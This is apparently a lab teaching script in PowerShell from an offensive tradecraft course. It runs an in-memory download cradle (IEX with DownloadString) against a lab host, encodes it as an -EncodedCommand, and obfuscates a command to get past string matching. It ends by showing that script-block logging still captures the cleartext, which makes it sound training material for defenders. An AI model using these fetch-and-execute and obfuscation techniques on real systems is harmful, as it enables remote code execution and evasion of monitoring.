# Worked example for Offensive Module 15 — PowerShell Offensive Tradecraft.
# Runs from the `attacker` container against the `web` payload host. Deterministic; exits 0.
# Authorised use only: this runs entirely against the lab's own containers.
. /lab/tradecraft.ps1

$target = 'http://web:8080/'
$cradle = "IEX (New-Object Net.WebClient).DownloadString('$target')"

Write-Output "== 1. Plain in-memory download cradle (ATT&CK T1059.001) =="
Write-Output "   $cradle"
Invoke-Expression $cradle
Write-Output ""

Write-Output "== 2. Same cradle, -EncodedCommand form (what the command line shows) =="
$enc = New-EncodedCommand -Command $cradle
Write-Output "   powershell.exe -enc $enc"
Write-Output "   ...decodes straight back to:"
Write-Output "   $(ConvertFrom-EncodedCommand -Encoded $enc)"
Write-Output ""

Write-Output "== 3. Behaviour-preserving obfuscation (defeats a naive string match) =="
$obf = New-ObfuscatedCommand -Command "Write-Output '[obf] same behaviour, different bytes'"
Write-Output "   $obf"
Invoke-Expression $obf
Write-Output ""

Write-Output "== 4. Why obfuscation still loses to script-block logging =="
Write-Output "   To execute, PowerShell must rebuild the cleartext — and logs it (Event 4104)."
$record = New-ScriptBlockLogRecord -ScriptBlockText $cradle
$record | ConvertTo-Json -Compress | ForEach-Object { Write-Output "   $_" }
Write-Output ""
Write-Output "   ^ This is the artifact Defensive Module 13 hunts. Obfuscation buys time, not invisibility."
